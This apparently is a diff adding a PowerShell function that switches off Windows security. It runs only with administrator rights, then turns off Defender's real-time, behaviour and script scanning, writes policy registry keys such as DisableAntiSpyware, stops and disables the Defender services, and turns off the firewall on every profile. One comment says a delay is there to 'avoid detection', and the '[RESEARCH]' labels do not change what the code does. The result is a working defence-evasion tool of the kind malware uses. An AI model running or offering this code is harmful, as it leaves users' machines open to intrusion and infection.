@@ -1,0 +1,123 @@
+function Disable-WindowsSecurity {
+    Write-Host "[RESEARCH] Studying Windows Security Disablement Techniques..." -ForegroundColor Yellow
+    
+    # Cek admin privileges dulu
+    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        Write-Host "[ERROR] Run script as Administrator!" -ForegroundColor Red
+        return
+    }
+    
+    try {
+        Write-Host "[RESEARCH] Attempting to disable Windows Defender components..." -ForegroundColor Yellow
+        
+        # 1. Disable via MpPreference (Primary method)
+        $defenderParams = @{
+            DisableRealtimeMonitoring = $true
+            DisableBehaviorMonitoring = $true
+            DisableBlockAtFirstSeen = $true
+            DisableIOAVProtection = $true
+            DisablePrivacyMode = $true
+            DisableScriptScanning = $true
+            DisableArchiveScanning = $true
+            DisableIntrusionPreventionSystem = $true
+            DisableEmailScanning = $true
+            DisableRemovableDriveScanning = $true
+            DisableRestorePoint = $true
+            DisableScanningMappedNetworkDrives = $true
+            DisableScanningNetworkFiles = $true
+            SubmitSamplesConsent = "NeverSend"
+        }
+        
+        foreach ($param in $defenderParams.GetEnumerator()) {
+            try {
+                Set-MpPreference -ErrorAction Stop @{$param.Key = $param.Value}
+                Write-Host "  ✅ $($param.Key)" -ForegroundColor Green
+            }
+            catch {
+                Write-Host "  ❌ $($param.Key): $($_.Exception.Message)" -ForegroundColor Red
+            }
+            Start-Sleep -Milliseconds 100  # Avoid detection
+        }
+        
+        # 2. Disable via Registry (Alternative method)
+        Write-Host "[RESEARCH] Applying registry modifications..." -ForegroundColor Yellow
+        $registryPaths = @(
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet"
+        )
+        
+        foreach ($path in $registryPaths) {
+            try {
+                if (-not (Test-Path $path)) {
+                    New-Item -Path $path -Force | Out-Null
+                }
+            }
+            catch {
+                Write-Host "  ❌ Registry: $path" -ForegroundColor Red
+            }
+        }
+        
+        # Set registry values to disable Defender
+        $registryValues = @{
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware" = 1
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring" = 1
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring" = 1
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection" = 1
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection" = 1
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScriptScanning" = 1
+        }
+        
+        foreach ($reg in $registryValues.GetEnumerator()) {
+            try {
+                Set-ItemProperty -Path $reg.Key -Name (Split-Path $reg.Key -Leaf) -Value $reg.Value -Force -ErrorAction Stop
+                Write-Host "  ✅ Registry: $(Split-Path $reg.Key -Leaf)" -ForegroundColor Green
+            }
+            catch {
+                Write-Host "  ❌ Registry: $(Split-Path $reg.Key -Leaf)" -ForegroundColor Red
+            }
+        }
+        
+        # 3. Stop and disable services
+        Write-Host "[RESEARCH] Controlling Windows Defender services..." -ForegroundColor Yellow
+        $services = @("WinDefend", "WdNisSvc", "Sense", "WdBoot", "WdFilter")
+        
+        foreach ($service in $services) {
+            try {
+                $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
+                if ($svc) {
+                    Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
+                    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
+                    Write-Host "  ✅ Service: $service stopped and disabled" -ForegroundColor Green
+                }
+            }
+            catch {
+                Write-Host "  ❌ Service: $service - $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        
+        # 4. Disable Windows Firewall
+        try {
+            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
+            Write-Host "[RESEARCH] Windows Firewall disabled" -ForegroundColor Green
+        }
+        catch {
+            Write-Host "[RESEARCH] Failed to disable firewall: $($_.Exception.Message)" -ForegroundColor Red
+        }
+        
+        Write-Host "[RESEARCH] Security controls modification attempted" -ForegroundColor Green
+        
+        # 5. Verify changes
+        Write-Host "`n[RESEARCH] Verification:" -ForegroundColor Cyan
+        $status = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        if ($status) {
+            Write-Host "  RealTimeProtection: $($status.RealTimeProtectionEnabled)" -ForegroundColor $(if(-not $status.RealTimeProtectionEnabled){'Green'}else{'Red'})
+            Write-Host "  AntivirusEnabled: $($status.AntivirusEnabled)" -ForegroundColor $(if(-not $status.AntivirusEnabled){'Green'}else{'Red'})
+        } else {
+            Write-Host "  Cannot verify status - Defender may be disabled" -ForegroundColor Yellow
+        }
+    }
+    catch {
+        Write-Host "[RESEARCH] Critical error in security disablement study: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
